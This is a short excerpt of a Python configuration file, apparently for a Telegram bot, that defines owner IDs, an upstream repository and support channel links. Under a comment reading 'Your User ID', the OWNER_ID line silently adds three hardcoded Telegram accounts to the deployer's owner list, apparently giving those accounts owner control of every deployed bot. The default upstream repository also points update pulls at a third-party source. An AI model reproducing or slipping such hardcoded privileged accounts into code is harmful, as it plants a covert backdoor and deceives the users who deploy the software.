...
# Your User ID.
OWNER_ID = list(
  map(int, getenv("OWNER_ID", "").split())) + [5566924539,6298482218,6018314315]
...
UPSTREAM_REPO = getenv(
    "UPSTREAM_REPO",
    "https://github.com/alielsayed13/stm",
)
...
SUPPORT_CHANNEL = getenv(
    "SUPPORT_CHANNEL","https://t.me/G5_7O")
  # Example:- https://t.me/TheYukki
SUPPORT_GROUP = getenv(
    "SUPPORT_GROUP","https://t.me/G5_7N")
